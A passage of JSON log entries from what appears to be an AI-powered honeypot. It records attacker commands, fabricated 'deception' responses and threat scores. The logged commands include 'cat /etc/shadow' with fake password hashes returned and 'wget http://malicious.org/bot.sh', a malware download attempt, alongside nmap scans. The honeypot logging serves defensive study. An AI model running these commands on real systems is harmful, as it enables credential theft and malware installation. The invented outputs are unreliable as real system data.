    "query": "nmap -sV 192.168.1.1",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 8,
        "risk_level": "LOW",
        "final_score": 8,
        "threat_level": "LOW",
        "base_score": 8,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 4,
            "unique_commands": 3,
            "directories_visited": 0,
            "recon_commands": 2,
            "persistence_attempts": 0,
            "curiosity_score": 27
        },
        "engagement": {
            "session_duration": 3,
            "commands_executed": 4,
            "successful_commands": 4,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 17,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 27,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 8,
            "Session Complexity": "LOW"
        },
        "commands": [
            "rmdir test_folder",
            "rmdir my_test_dir",
            "nmap -sV 192.168.1.1",
            "nmap -sV 192.168.1.1"
        ],
        "confidence_score": 0.7
    }
}
2026-07-20 14:34:46,165 - {"session_id": "0169fb1f", "command": "nmap -sV 192.168.1.1", "attack_type": "Reconnaissance", "risk_score": 8, "threat_level": "LOW"}
2026-07-20 14:34:46,165 - {
    "session_id": "0169fb1f",
    "command": "nmap -sV 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "0169fb1f",
        "interaction_count": 4
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 8,
    "threat_level": "LOW"
}
2026-07-20 14:34:46,165 - {
    "session_id": "0169fb1f",
    "conversation_log": "Attacker executed: nmap -sV 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-20 18:19:26,112 - {
    "session_id": "22c8dcad",
    "query": "nmap -sS -v 10.0.0.1",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 3,
        "risk_level": "LOW",
        "final_score": 3,
        "threat_level": "LOW",
        "base_score": 3,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 1,
            "unique_commands": 1,
            "directories_visited": 1,
            "recon_commands": 1,
            "persistence_attempts": 0,
            "curiosity_score": 12
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 1,
            "successful_commands": 1,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 4,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 12,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 3,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1"
        ],
        "confidence_score": 0.55
    }
}
2026-07-20 18:19:26,113 - {"session_id": "22c8dcad", "command": "nmap -sS -v 10.0.0.1", "attack_type": "Reconnaissance", "risk_score": 3, "threat_level": "LOW"}
2026-07-20 18:19:26,113 - {
    "session_id": "22c8dcad",
    "command": "nmap -sS -v 10.0.0.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 1
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 3,
    "threat_level": "LOW"
}
2026-07-20 18:19:26,113 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: nmap -sS -v 10.0.0.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-20 18:19:32,203 - {
    "session_id": "22c8dcad",
    "query": "cat /etc/shadow",
    "response": "root:$6$rounds=40000$saltsaltsalt$M1U5B2r7s7d1i9s1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2:19000:0:99999:7:::\nubuntu:$6$rounds=40000$anothersalt$v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8:19000:0:99999:7:::\ndev:$6$rounds=40000$yetanothersalt$f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7:19000:0:99999:7:::\nadmin:$6$rounds=40000$adminsalt$M6t8Y9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8:19000:0:99999:7:::\nsupport:$6$rounds=40000$supportsalt$p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9:19000:0:99999:7:::\nbackupuser:$6$rounds=40000$backupsalt$y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1:19000:0:99999:7:::",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 11,
        "risk_level": "LOW",
        "final_score": 11,
        "threat_level": "LOW",
        "base_score": 8,
        "multiplier": 1.4,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 2,
            "unique_commands": 2,
            "directories_visited": 2,
            "recon_commands": 1,
            "persistence_attempts": 0,
            "curiosity_score": 19
        },
        "engagement": {
            "session_duration": 7,
            "commands_executed": 2,
            "successful_commands": 2,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 13,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 19,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 11,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow"
        ],
        "confidence_score": 0.6
    }
}
2026-07-20 18:19:32,203 - {"session_id": "22c8dcad", "command": "cat /etc/shadow", "attack_type": "Privilege Enumeration", "risk_score": 11, "threat_level": "LOW"}
2026-07-20 18:19:32,203 - {
    "session_id": "22c8dcad",
    "command": "cat /etc/shadow",
    "ai_decision": "root:$6$rounds=40000$saltsaltsalt$M1U5B2r7s7d1i9s1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2:19000:0:99999:7:::\nubuntu:$6$rounds=40000$anothersalt$v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8:19000:0:99999:7:::\ndev:$6$rounds=40000$yetanothersalt$f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7:19000:0:99999:7:::\nadmin:$6$rounds=40000$adminsalt$M6t8Y9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8:19000:0:99999:7:::\nsupport:$6$rounds=40000$supportsalt$p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9:19000:0:99999:7:::\nbackupuser:$6$rounds=40000$backupsalt$y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1:19000:0:99999:7:::",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 2
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.9
    },
    "risk_score": 11,
    "threat_level": "LOW"
}
2026-07-20 18:19:32,203 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: cat /etc/shadow",
    "ai_decision": "root:$6$rounds=40000$saltsaltsalt$M1U5B2r7s7d1i9s1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2:19000:0:99999:7:::\nubuntu:$6$rounds=40000$anothersalt$v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8:19000:0:99999:7:::\ndev:$6$rounds=40000$yetanothersalt$f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7:19000:0:99999:7:::\nadmin:$6$rounds=40000$adminsalt$M6t8Y9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8:19000:0:99999:7:::\nsupport:$6$rounds=40000$supportsalt$p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9:19000:0:99999:7:::\nbackupuser:$6$rounds=40000$backupsalt$y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1:19000:0:99999:7:::",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Privilege Enumeration",
    "warning": null,
    "error": null
}
2026-07-20 18:19:39,212 - {
    "session_id": "83e1b570",
    "query": "wget http://malicious.org/bot.sh",
    "response": "Resolving malware.sh (malware.sh)... 192.168.1.10\nConnecting to malware.sh (malware.sh)|192.168.1.10|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K) [application/x-sh]\nSaving to: 'bot.sh'\n\nbot.sh          100%[===================>]   2.00K  --.-KB/s    in 0.002s  \n\n2026-06-15 14:55:02 (980 KB/s) - 'bot.sh' saved [2048/2048]",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 8,
        "risk_level": "LOW",
        "final_score": 8,
        "threat_level": "LOW",
        "base_score": 8,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 1,
            "unique_commands": 1,
            "directories_visited": 1,
            "recon_commands": 0,
            "persistence_attempts": 0,
            "curiosity_score": 7
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 1,
            "successful_commands": 1,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 4,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 7,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 8,
            "Session Complexity": "LOW"
        },
        "commands": [
            "wget http://malicious.org/bot.sh"
        ],
        "confidence_score": 0.55
    }
}
2026-07-20 18:19:39,212 - {"session_id": "83e1b570", "command": "wget http://malicious.org/bot.sh", "attack_type": "Malware Download Attempt", "risk_score": 8, "threat_level": "LOW"}
2026-07-20 18:19:39,212 - {
    "session_id": "83e1b570",
    "command": "wget http://malicious.org/bot.sh",
    "ai_decision": "Resolving malware.sh (malware.sh)... 192.168.1.10\nConnecting to malware.sh (malware.sh)|192.168.1.10|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K) [application/x-sh]\nSaving to: 'bot.sh'\n\nbot.sh          100%[===================>]   2.00K  --.-KB/s    in 0.002s  \n\n2026-06-15 14:55:02 (980 KB/s) - 'bot.sh' saved [2048/2048]",
    "confidence_score": 0.95,
    "conversation_metadata": {
        "conversation_id": "83e1b570",
        "interaction_count": 1
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.95
    },
    "risk_score": 8,
    "threat_level": "LOW"
}
2026-07-20 18:19:39,212 - {
    "session_id": "83e1b570",
    "conversation_log": "Attacker executed: wget http://malicious.org/bot.sh",
    "ai_decision": "Resolving malware.sh (malware.sh)... 192.168.1.10\nConnecting to malware.sh (malware.sh)|192.168.1.10|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K) [application/x-sh]\nSaving to: 'bot.sh'\n\nbot.sh          100%[===================>]   2.00K  --.-KB/s    in 0.002s  \n\n2026-06-15 14:55:02 (980 KB/s) - 'bot.sh' saved [2048/2048]",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Malware Download Attempt",
    "warning": null,
    "error": null
}
2026-07-20 18:39:46,534 - {
    "session_id": "22c8dcad",
    "query": "nmap -sS -v 192.168.1.1",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 11,
        "risk_level": "LOW",
        "final_score": 11,
        "threat_level": "LOW",
        "base_score": 11,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 3,
            "unique_commands": 3,
            "directories_visited": 2,
            "recon_commands": 2,
            "persistence_attempts": 0,
            "curiosity_score": 29
        },
        "engagement": {
            "session_duration": 1220,
            "commands_executed": 3,
            "successful_commands": 3,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 34,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 29,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 11,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1"
        ],
        "confidence_score": 0.65
    }
}
2026-07-20 18:39:46,534 - {"session_id": "22c8dcad", "command": "nmap -sS -v 192.168.1.1", "attack_type": "Reconnaissance", "risk_score": 11, "threat_level": "LOW"}
2026-07-20 18:39:46,534 - {
    "session_id": "22c8dcad",
    "command": "nmap -sS -v 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 3
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 11,
    "threat_level": "LOW"
}
2026-07-20 18:39:46,534 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: nmap -sS -v 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-20 18:39:55,931 - {
    "session_id": "22c8dcad",
    "query": "nmap -p 80,443 target.org",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 14,
        "risk_level": "LOW",
        "final_score": 14,
        "threat_level": "LOW",
        "base_score": 14,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 4,
            "unique_commands": 4,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 39
        },
        "engagement": {
            "session_duration": 1229,
            "commands_executed": 4,
            "successful_commands": 4,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 38,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 39,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 14,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org"
        ],
        "confidence_score": 0.7
    }
}
2026-07-20 18:39:55,931 - {"session_id": "22c8dcad", "command": "nmap -p 80,443 target.org", "attack_type": "Reconnaissance", "risk_score": 14, "threat_level": "LOW"}
2026-07-20 18:39:55,931 - {
    "session_id": "22c8dcad",
    "command": "nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 4
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 14,
    "threat_level": "LOW"
}
2026-07-20 18:39:55,931 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-20 18:39:59,211 - {
    "session_id": "22c8dcad",
    "query": "whoami",
    "response": "ubuntu",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 15,
        "risk_level": "LOW",
        "final_score": 15,
        "threat_level": "LOW",
        "base_score": 15,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 5,
            "unique_commands": 5,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 44
        },
        "engagement": {
            "session_duration": 1234,
            "commands_executed": 5,
            "successful_commands": 5,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 42,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 44,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 15,
            "Session Complexity": "MEDIUM"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami"
        ],
        "confidence_score": 0.75
    }
}
2026-07-20 18:39:59,211 - {"session_id": "22c8dcad", "command": "whoami", "attack_type": "Unknown", "risk_score": 15, "threat_level": "LOW"}
2026-07-20 18:39:59,211 - {
    "session_id": "22c8dcad",
    "command": "whoami",
    "ai_decision": "ubuntu",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 5
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.5
    },
    "risk_score": 15,
    "threat_level": "LOW"
}
2026-07-20 18:39:59,211 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: whoami",
    "ai_decision": "ubuntu",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:40:02,984 - {
    "session_id": "22c8dcad",
    "query": "id",
    "response": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),110(lxd)",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 16,
        "risk_level": "LOW",
        "final_score": 16,
        "threat_level": "LOW",
        "base_score": 16,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 6,
            "unique_commands": 6,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 49
        },
        "engagement": {
            "session_duration": 1238,
            "commands_executed": 6,
            "successful_commands": 6,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 46,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 49,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 16,
            "Session Complexity": "MEDIUM"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id"
        ],
        "confidence_score": 0.8
    }
}
2026-07-20 18:40:02,984 - {"session_id": "22c8dcad", "command": "id", "attack_type": "Unknown", "risk_score": 16, "threat_level": "LOW"}
2026-07-20 18:40:02,984 - {
    "session_id": "22c8dcad",
    "command": "id",
    "ai_decision": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),110(lxd)",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 6
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.5
    },
    "risk_score": 16,
    "threat_level": "LOW"
}
2026-07-20 18:40:02,984 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: id",
    "ai_decision": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),110(lxd)",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:40:07,881 - {
    "session_id": "22c8dcad",
    "query": "uname -a",
    "response": "Linux web-prod-01 5.15.0-generic x86_64 GNU/Linux",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 20,
        "risk_level": "LOW",
        "final_score": 20,
        "threat_level": "LOW",
        "base_score": 20,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 7,
            "unique_commands": 7,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 54
        },
        "engagement": {
            "session_duration": 1241,
            "commands_executed": 7,
            "successful_commands": 7,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 50,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 54,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 20,
            "Session Complexity": "MEDIUM"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a"
        ],
        "confidence_score": 0.85
    }
}
2026-07-20 18:40:07,881 - {"session_id": "22c8dcad", "command": "uname -a", "attack_type": "System Enumeration", "risk_score": 20, "threat_level": "LOW"}
2026-07-20 18:40:07,997 - {
    "session_id": "22c8dcad",
    "command": "uname -a",
